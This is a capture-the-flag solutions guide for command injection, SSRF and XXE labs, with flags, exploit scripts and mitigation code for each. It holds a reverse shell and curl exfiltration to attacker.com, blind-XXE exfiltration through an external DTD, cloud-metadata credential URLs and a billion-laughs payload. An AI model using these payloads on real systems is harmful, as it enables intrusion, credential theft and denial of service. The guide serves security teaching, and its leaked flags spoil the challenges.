# Medium Level CTF Challenges - Complete Solutions Guide

> **⚠️ SPOILER ALERT**: This document contains full walkthroughs for all medium challenges.

---

## Table of Contents

1. [2.1 Command Injection (Port 8004)](#21-command-injection-port-8004)
2. [2.2 SSRF Internal (Port 8005)](#22-ssrf-internal-port-8005)
3. [2.3 XXE Injection (Port 8006)](#23-xxe-injection-port-8006)

---

## 2.1 Command Injection (Port 8004)

**Vulnerability**: OS Command Injection via unsanitized ping input  
**Flag**: `CTF{rce_through_ping}`  
**Difficulty**: ⭐⭐ Medium

### Background

The application uses Python's `subprocess.run()` with `shell=True`:

```python
result = subprocess.run(
    f"ping -c 2 {host}",
    shell=True,
    capture_output=True,
    text=True,
    timeout=10
)
```

When `shell=True`, the shell interprets special characters like `;`, `&&`, `||`, and `|`, allowing command chaining.

### Solution Steps

#### Step 1: Access the Application
```
http://35.210.32.202:8004/
```

You'll see a form with a text input for "Network Diagnostic Tool" that asks for a hostname.

#### Step 2: Test with a Normal Ping
Enter a valid IP or hostname:
```
8.8.8.8
```

The application will execute: `ping -c 2 8.8.8.8` and show the output.

#### Step 3: Identify the Vulnerability
The hint states: "Network admins often chain commands together..."

This suggests using command chaining operators.

#### Step 4: Exploit with Command Chaining

**Option A: Using `&&` (AND operator)**
```
127.0.0.1 && cat /flag.txt
```

The shell will execute:
1. `ping -c 2 127.0.0.1` (succeeds)
2. `cat /flag.txt` (executes because previous command succeeded)

**Option B: Using `;` (Sequential operator)**
```
127.0.0.1; cat /flag.txt
```

The shell will execute both commands regardless of the first command's success.

**Option C: Using `|` (Pipe)**
```
127.0.0.1 | cat /flag.txt
```

**Option D: Using Command Substitution**
```
127.0.0.1 $(cat /flag.txt)
```

#### Step 5: Retrieve the Flag

Submit the payload `127.0.0.1 && cat /flag.txt` and observe the output.

The application will display both:
- Ping output for 127.0.0.1
- Contents of /flag.txt

**Expected Output**:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.100 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.050 ms

--- 127.0.0.1 statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/dev = 0.050/0.075/0.100/0.025 ms

CTF{rce_through_ping}
```

### Tools You Could Use

#### Using curl with shell escape:
```bash
curl -X POST http://35.210.32.202:8004/ \
  -d "host=127.0.0.1 && cat /flag.txt"
```

#### Using Python requests:
```python
import requests
url = "http://35.210.32.202:8004/"
payload = {"host": "127.0.0.1 && cat /flag.txt"}
resp = requests.post(url, data=payload)
print(resp.text)
```

#### Using bash script:
```bash
#!/bin/bash
host="127.0.0.1 && cat /flag.txt"
curl -s -X POST http://35.210.32.202:8004/ \
  -d "host=$host" | grep "CTF{"
```

### Advanced Exploitation

#### Read multiple files:
```
127.0.0.1 && cat /etc/passwd
```

#### Search for flags:
```
127.0.0.1 && find / -name "*flag*" 2>/dev/null
```

#### Reverse shell (in real scenarios):
```
127.0.0.1 && bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

#### Data exfiltration:
```
127.0.0.1 && curl http://attacker.com/?flag=$(cat /flag.txt)
```

### Mitigation

The proper fix involves removing `shell=True` and using a list instead:

```python
# SECURE CODE
subprocess.run(
    ["ping", "-c", "2", host],
    shell=False,  # Don't use shell
    capture_output=True,
    text=True,
    timeout=10
)
```

With this change, special characters are treated as literal strings, not shell operators.

---

## 2.2 SSRF Internal (Port 8005)

**Vulnerability**: Server-Side Request Forgery (SSRF) to access internal endpoints  
**Flag**: `CTF{ssrf_metadata_leak}`  
**Difficulty**: ⭐⭐ Medium

### Background

The application fetches URLs on behalf of the user without validation:

```python
resp = requests.get(url, timeout=5, allow_redirects=True)
content = resp.text[:5000]
```

Since the application runs on the server, it can access:
- Localhost (`127.0.0.1`)
- Private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, etc.)
- Internal services and APIs
- Cloud metadata endpoints

### Solution Steps

#### Step 1: Access the Application
```
http://35.210.32.202:8005/
```

You'll see a "URL Preview Service" form asking to enter a URL to fetch.

#### Step 2: Explore Public Endpoints
The hint suggests: "Try: `/api/endpoints` to see available API routes"

**Option A: Through the Form**
1. Enter: `http://localhost:5000/api/endpoints`
2. Click "Fetch"
3. See the public endpoints listed

**Option B: Direct access** (from your machine won't work - shows why SSRF is useful)
```bash
curl http://35.210.32.202:5000/api/endpoints
```
Result: Connection refused (port 5000 is internal only)

#### Step 3: Discover Internal Endpoints

The API response shows:
```json
{
  "public": ["/", "/api/endpoints", "/healthz"],
  "internal": ["This service also has internal endpoints not meant for public access..."]
}
```

This tells you there are internal endpoints!

#### Step 4: Access Internal Endpoints via SSRF

**Accessing `/internal/status`:**
```
http://localhost:5000/internal/status
```

Response:
```json
{
  "status": "running",
  "internal": true,
  "hint": "You found an internal endpoint! Can you find the flag?"
}
```

**Accessing `/internal/admin`:**
```
http://localhost:5000/internal/admin
```

Response:
```json
{
  "admin": true,
  "flag": "CTF{ssrf_metadata_leak}",
  "message": "Congratulations! You accessed the internal admin panel via SSRF!"
}
```

#### Step 5: Retrieve the Flag

**Option A: Via `/internal/admin`** (recommended)
Submit: `http://localhost:5000/internal/admin`
The flag appears directly in the JSON response.

**Option B: Via `/flag` endpoint**
Submit: `http://localhost:5000/flag`

Response:
```json
{"flag": "CTF{ssrf_metadata_leak}"}
```

### Tools You Could Use

#### Using curl:
```bash
curl -X POST http://35.210.32.202:8005/ \
  -d "url=http://localhost:5000/internal/admin"
```

#### Using Python:
```python
import requests
from urllib.parse import urlencode

url = "http://35.210.32.202:8005/"
data = {"url": "http://localhost:5000/internal/admin"}
resp = requests.post(url, data=data)
print(resp.text)
# Look for the flag in the response
```

#### Using Burp Suite:
1. Intercept the POST request
2. Modify `url` parameter to: `http://localhost:5000/internal/admin`
3. Send and observe the response

### Advanced SSRF Techniques

#### Port Scanning (finding services):
```
http://localhost:3000/
http://localhost:6379/
http://localhost:27017/
```

#### Accessing different internal services:
```
http://192.168.1.1/admin
http://10.0.0.1/config
```

#### Cloud Metadata (GCP):
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
```

#### Cloud Metadata (AWS):
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/instance-identity/document
```

#### Cloud Metadata (Azure):
```
http://169.254.169.254/metadata/instance?api-version=2019-02-01
```

### Mitigation

```python
# SECURE CODE
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url):
    """Check if URL is safe to fetch"""
    parsed = urlparse(url)
    
    # Blocklist private IP ranges
    private_ranges = [
        ipaddress.ip_network('127.0.0.0/8'),      # Loopback
        ipaddress.ip_network('10.0.0.0/8'),       # Private
        ipaddress.ip_network('172.16.0.0/12'),    # Private
        ipaddress.ip_network('192.168.0.0/16'),   # Private
        ipaddress.ip_network('169.254.0.0/16'),   # Link-local
    ]
    
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for range_ in private_ranges:
            if ip in range_:
                return False
    except ValueError:
        pass  # Hostname, not IP
    
    # Allow only specific domains
    allowed_domains = ['example.com', 'api.example.com']
    if parsed.hostname not in allowed_domains:
        return False
    
    return True

# Only fetch safe URLs
if is_safe_url(url):
    resp = requests.get(url, timeout=5)
```

---

## 2.3 XXE Injection (Port 8006)

**Vulnerability**: XML External Entity Injection for file disclosure  
**Flag**: `CTF{xxe_file_disclosure}`  
**Difficulty**: ⭐⭐ Medium

### Background

The XML parser is configured to resolve external entities:

```python
parser = etree.XMLParser(
    resolve_entities=True,    # Allows entity resolution
    no_network=False,         # Allows network access
    load_dtd=True            # Loads DTDs
)
root = etree.fromstring(xml_input.encode(), parser)
```

External entities can reference:
- Files on the system
- Network resources
- Entity-defined content
- Other malicious content

### Solution Steps

#### Step 1: Access the Application
```
http://35.210.32.202:8006/
```

You'll see "XML User Import Service" with:
- Example XML format
- Text area to submit XML
- Hint: "Ever heard of DTDs?"
- Hint: "The flag is stored at `/flag.txt` on the server"

#### Step 2: Test with Valid XML

Submit the provided example:
```xml
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
  <role>user</role>
</user>
```

The application processes it and shows:
```
Name: John Doe
Email: john@example.com
Role: user
```

This confirms the XML parser is working.

#### Step 3: Craft XXE Payload

Create an XML with an external entity that reads `/flag.txt`:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
  <role>user</role>
</user>
```

**Explanation**:
- `DOCTYPE user` - Define a custom document type
- `<!ENTITY xxe SYSTEM "file:///flag.txt">` - Create an entity that reads the file
- `&xxe;` - Reference the entity in the XML (triggers file reading)

#### Step 4: Submit the Payload

Copy the XXE payload and submit it through the form.

The application will:
1. Parse the XML
2. Resolve the external entity
3. Read `/flag.txt` from the filesystem
4. Replace `&xxe;` with the file contents

**Expected Output**:
```
Name: CTF{xxe_file_disclosure}
Email: test@example.com
Role: user
```

The flag appears in the Name field!

#### Step 5: Retrieve the Flag

The flag is: `CTF{xxe_file_disclosure}`

### Alternative XXE Payloads

#### Reading /etc/passwd:
```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
  <role>user</role>
</user>
```

#### Blind XXE (when output isn't reflected):
```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<user>
  <name>John</name>
</user>
```

Where `evil.dtd` contains:
```xml
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

#### Using API endpoint with XXE:
```bash
curl -X POST http://35.210.32.202:8006/api/import \
  -H "Content-Type: application/xml" \
  -d @payload.xml
```

Where `payload.xml` contains the XXE payload.

### Tools You Could Use

#### Using Python:
```python
import requests

url = "http://35.210.32.202:8006/"

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
  <role>user</role>
</user>"""

resp = requests.post(url, data={"xml": xxe_payload})
print(resp.text)
# Extract flag from response
```

#### Using curl:
```bash
xxe_payload='<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
  <role>user</role>
</user>'

curl -X POST http://35.210.32.202:8006/ \
  -d "xml=$(echo "$xxe_payload" | jq -sRr @uri)"
```

#### Using Burp Suite:
1. Send a normal XML request to Repeater
2. Modify the XML with XXE payload
3. Send and observe the response

### Advanced XXE Exploitation

#### Billion Laughs (DoS Attack):
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<user>
  <name>&lol4;</name>
</user>
```

This exponentially expands the entity, causing memory exhaustion.

#### XXE with Network Protocol:
```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "http://internal-api:8000/admin">
]>
<user>
  <name>&xxe;</name>
</user>
```

#### Reading file with different encodings:
```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<user>
  <name>&xxe;</name>
</user>
```

### Mitigation

The secure fix disables external entity resolution:

```python
# SECURE CODE
parser = etree.XMLParser(
    resolve_entities=False,   # Disable entity resolution
    no_network=True,          # Disable network access
    dtd_validation=False,     # Disable DTD validation
    load_dtd=False            # Don't load DTDs
)
```

Or use a safer library:
```python
import defusedxml.ElementTree as ET

root = ET.fromstring(xml_input)  # Safe by default
```

Better yet, avoid XML entirely and use JSON:
```python
import json
data = json.loads(json_input)  # Much safer!
```

---

## Summary Table

| Challenge | Port | Vulnerability | Flag |
|-----------|------|-----------------|------|
| Command Injection | 8004 | Unsanitized `shell=True` subprocess | `CTF{rce_through_ping}` |
| SSRF Internal | 8005 | No URL validation | `CTF{ssrf_metadata_leak}` |
| XXE Injection | 8006 | Enabled external entities | `CTF{xxe_file_disclosure}` |

---

## Key Lessons

### Command Injection
- Never use `shell=True` with user input
- Always validate and sanitize input
- Use parameterized/list-based commands
- Principle of least privilege

### SSRF
- Validate all URLs against allowlists
- Block private IP ranges
- Don't trust localhost/internal endpoints
- Monitor outbound requests

### XXE
- Disable external entity resolution
- Use safe XML libraries
- Prefer JSON over XML when possible
- Validate uploaded XML files


